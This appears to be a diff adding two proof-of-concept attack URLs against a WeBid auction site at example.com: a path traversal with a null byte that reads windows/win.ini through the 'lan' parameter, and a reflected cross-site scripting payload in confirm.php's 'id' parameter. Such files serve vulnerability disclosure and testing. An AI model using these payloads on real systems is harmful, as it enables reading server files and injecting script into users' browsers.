@@ -1,0 +1,4 @@
+
+http://www.example.com/webid/active_auctions.php?lan=../../../../../../../../windows/win.ini%00
+
+http://www.example.com/webid/confirm.php?id=%22%3E%3Cscript%3Ealert(0)%3C/script%3E
